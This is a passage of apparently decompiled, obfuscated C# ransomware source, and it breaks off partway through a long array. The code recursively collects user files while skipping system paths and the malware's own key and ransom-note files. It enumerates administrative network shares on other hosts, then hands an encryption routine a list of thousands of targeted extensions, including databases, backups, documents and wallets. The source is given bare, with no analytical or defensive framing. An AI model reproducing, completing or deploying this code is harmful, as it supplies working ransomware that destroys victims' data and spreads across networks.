using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AtzRcdKSbeZN;
using Microsoft.Win32;
using vSGubnVNNvJZeIbl;

namespace dfbDZtGQEYGzK;

internal class sWSXzQkxHH
{
	public class jxksNelHvCKE
	{
		private static StringCollection dKDJVwOhii = new StringCollection();

		private static List<string> uzwmNauxReOXu = new List<string>();

		public static List<string> SearchFiles(string rootDir)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(rootDir);
		}

		private static List<string> WalkDirectoryTree(string root)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(root, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".ltnuhr") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(ZJFGqhHHen))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(GzxiPdZuaEvsB) * 1024.0 * 1024.0 && nJXwSRTfZcW == "YES")
							{
								uzwmNauxReOXu.Add(text);
							}
							else if (File.Exists(text) && nJXwSRTfZcW == "NO")
							{
								uzwmNauxReOXu.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(root);
				string[] array4 = array2;
				foreach (string root2 in array4)
				{
					WalkDirectoryTree(root2);
				}
			}
			return uzwmNauxReOXu;
		}
	}

	[CompilerGenerated]
	private sealed class RdWVxEgtZEi
	{
		public string uSAYpqXEXWENr;

		public bool _003CMain_003Eb__5(Process p)
		{
			return p.ProcessName == uSAYpqXEXWENr;
		}
	}

	[CompilerGenerated]
	private sealed class XlGmaUihMrRY
	{
		public string iWhtVQxqRaT;

		public void _003CMapDrv_003Eb__19(int g)
		{
			Thread.Sleep(PRCzDJqMXxgFe);
			ykYiTFCYjtGh.Add("\\\\" + iWhtVQxqRaT + "\\" + (char)g + "$");
			try
			{
				if (hzzRDIjGDyq)
				{
					Console.WriteLine("\\\\" + iWhtVQxqRaT + "\\" + (char)g + "$");
				}
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private sealed class JBqpFdxbkgYBin
	{
		public string MYQOTfnKqBSk;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo d)
		{
			return d.RootDirectory.Name == MYQOTfnKqBSk;
		}
	}

	[CompilerGenerated]
	private sealed class jTkzBngIgNrZmZ
	{
		public string EcLWoOXiuXrWK;

		public void _003CEncodeOnTheWay_003Eb__21()
		{
			IqHvwZeNnat(EcLWoOXiuXrWK, new string[4823]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
